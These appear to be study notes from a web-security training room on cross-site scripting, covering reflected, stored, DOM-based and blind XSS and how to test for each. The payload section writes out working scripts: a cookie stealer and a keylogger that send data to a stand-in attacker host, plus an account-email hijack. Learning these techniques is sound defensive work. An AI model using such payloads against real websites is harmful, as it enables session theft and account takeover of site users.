# Debrief 
XSS is based on JavaScript, and it would be helpful to know the language, but none of the covered examples are too complicated. In this room, I will learn how about different XSS types, how to create payloads, how to modify payloads to evade filters, and then end with a practical lab.


<h3> XSS Payloads </h3>
```
A payload is the JavaScript code that is to be executed on the targets computer. The intention is what is wished for the JavaScript to actually do and the modification is the changes to the code we need to make it execute as every scenario is different. 
Examples of XSS intentions 
	Proof of Concept: 
		Simplest payload where all you want to do is demonstrate that you can achieve XSS on a website. 
		<script>alert('XSS');</script>
	Session Stealing:
		Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user. 
		<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
	Key Logger:
		Acts as a key logger and tracks anything that is typed on the website and will be forwarded to a website under the hacker's control. Could be damaging if the payload was installed on accepted user logins or credit card detail
		<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
	Business Logic:
		This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail(). Your payload could look like:
		<script>user.changeEmail('attacker@hacker.thm');</script> 
```

# Reflected XSS
Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation. 

Example Scenario: 
	A website where if you enter incorrect input, an error message is displayed. The content of the error message gets taken from the error parameter in the query string is built directly into the page source. 

Potential Impact:
	The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims, getting them to execute code on their browser, potentially revealing session or customer information. 

How to test
	Every possible parameter needs to be tested, of which include Parameters in the URL query string, URL file path, and sometimes HTTP Headers.

Once some data was found that was being reflected in the web application, the JavaScript payload needs to be confirmed. Your payload will be dependent on where in the application your code is reflected.

# Stored XSS
The XSS payload is stored on the web application and then gets run when other users visit the site or web page.
For example, a blog allows comments, the blog does not check for JavaScript. If a comment is posted that contains JavaScript, this will be stored in the database, and every other user now visiting will have the JavaScript run in their browser. 
The impact may include someone stealing the user's session cookies, or performing other website actions while acting as the visiting user. 

How to test
	Need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be 
	- Comments on a blog post
	- User Profile Information
	- Website Listings
Sometimes developers think limiting values on the client side is good enough protection, so changing values to something the web application wouldn't be expecting is a good source of discovering stored XSS, for example, an age field that is expecting an integer from a dropdown menu, but instead, you manually send the request rather than using the form allowing you to try malicious payloads.
Once you've found some data which is being stored in the web application, you'll need to confirm that you can successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected.


# DOM Based XSS
DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. DOM based XSS is where the JavaScript execution happens directly in the browser, without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction. For example, a website's JavaScript gets the contents from the window.location.hash parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the website.
Potential Impact 
	Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session
How to test 
	DOM based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code.  Certain parts of the code that can access variables need to be viewed as the attacker can have control over them, such as window.location.x. When these bits of code are found, tou would then have to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as eval()

# Blind XSS
Blind Xss is similar to a stored XSS in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.
Example:
	A website has a contact form where you can message staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish